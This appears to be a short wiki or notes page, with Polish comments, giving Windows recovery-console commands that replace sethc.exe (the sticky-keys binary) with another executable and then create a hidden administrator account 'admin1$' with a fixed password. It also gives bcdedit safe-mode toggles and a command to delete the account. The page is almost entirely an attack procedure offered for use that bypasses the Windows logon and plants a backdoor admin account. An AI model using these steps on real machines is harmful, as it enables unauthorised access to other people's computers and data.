---
layout:
  title:
    visible: false
  description:
    visible: false
  tableOfContents:
    visible: false
  outline:
    visible: false
  pagination:
    visible: false
---

# via Windows

```python
#Repair your computer
#Troubleshoot
#Command Prompt
wmic logicaldisk get name
D:
dir
cd Windows
cd System32
copy sethc.exe sethc_backup.exe
copy ftp.exe sethc.exe
reboot -f
```

**Windows logon**

```python
net user admin1$ 1qaz!QAZ /add
net localgroup administrators admin1$ /add
#restart i logujemy się

#jak jakieś błędy to można włączyć safe mode
bcdedit /set {default} safeboot minimal

#wyłączanie
bcdedit /deletevalue {default} safeboot
```

```python
#kasowanie konta
net user admin1$ /delete
```
